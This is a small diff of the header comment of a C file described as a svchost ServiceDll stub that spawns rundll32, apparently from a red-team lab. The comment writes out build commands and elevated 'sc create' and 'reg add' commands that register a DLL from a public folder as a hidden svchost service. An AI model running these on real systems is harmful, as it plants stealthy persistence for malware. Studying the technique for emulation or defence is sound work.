@@ -1,5 +1,5 @@
 /*
- * c0015_svc_stub.c — svchost ServiceDll stub that spawns rundll32 [LAB-MECHANISM]
+ * c0015_svc_stub.c - svchost ServiceDll stub that spawns rundll32 [LAB-MECHANISM]
  *
  * WHY THIS EXISTS (route A, decided 2026-10-23)
  * ---------------------------------------------
@@ -30,7 +30,7 @@
  * BUILD (Kali / mingw)
  *   x86_64-w64-mingw32-gcc -shared -o c0015_stage.dll payloads/dll/c0015_svc_stub.c -ladvapi32
  *
- * INSTALL (elevated, on WS01) — see payloads/packaging/install_stage_service.ps1
+ * INSTALL (elevated, on WS01) - see payloads/packaging/install_stage_service.ps1
  *   sc create c0015svc type= own start= demand binPath= "%SystemRoot%\System32\svchost.exe -k c0015grp"
  *   reg add "HKLM\SYSTEM\CurrentControlSet\Services\c0015svc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\Public\C0015\c0015_stage.dll" /f
  *   reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v c0015grp /t REG_MULTI_SZ /d c0015svc /f
